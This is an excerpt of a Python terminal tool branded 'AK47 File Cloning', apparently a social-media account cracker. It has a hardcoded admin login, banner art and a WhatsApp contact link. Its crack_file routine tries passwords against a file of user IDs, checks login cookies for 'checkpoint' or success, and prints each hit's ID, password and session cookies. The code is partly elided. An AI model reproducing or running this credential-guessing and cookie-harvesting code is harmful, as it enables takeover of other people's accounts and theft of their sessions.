...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mAK47')
...
while attemps < 12345677901:
    ...
    if username == 'SAIMON' and password == 'AK47':
...
\033[0;92m| $$  | $$| $$\  $$       | $$  /$$/    
\033[0;92m| $$  | $$| $$ \  $$      | $$ /$$/     
\033[0;92m|__/  |__/|__/  \__/      |__/|__/                                                                                                                                                                                                                  
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m •  CEO AK47 FIRE (🥰)
\033[0;92m • FILE CLONING ACTIVE FIRE (🔥)
\033[0;92m • VERSION CODE [ 1. ] FREE (😻)
  \033[0;92m═════════════════════════════════════════════ \033[1;31m""")
def login():
	banner()
	AK47j('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	AK47j('\033[0;97m===============================================')
	AK47= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if AK47 in ['m']:
		public()
	elif AK47 in ['1']:
		crack_file()
		...
		os.system('xdg-open https://wa.me/+8801773151605')
	elif AK47 in ['0']:
...
def crack_file():
	...
	print('\033[1;32m [Put File Example:  /sdcard/AK47.txt  Etc...]')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#AK47-King
				print(f'\r\033[0;94m[{time.strftime("%H:%M")}•AK47-Cp] {idf} • {pw}\n\033[0;93[🤟]= COOKIES• \033[0;92m{kuki} ')     
				...
				#AK47-King
				print(f'\r\033[0;92m[AK47-➼-OK😻] {idf} • {pw}\n\033[0;93m[🔥]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m===============================================')
				os.system('espeak -a 300 " AK47,  Ok,  id"')
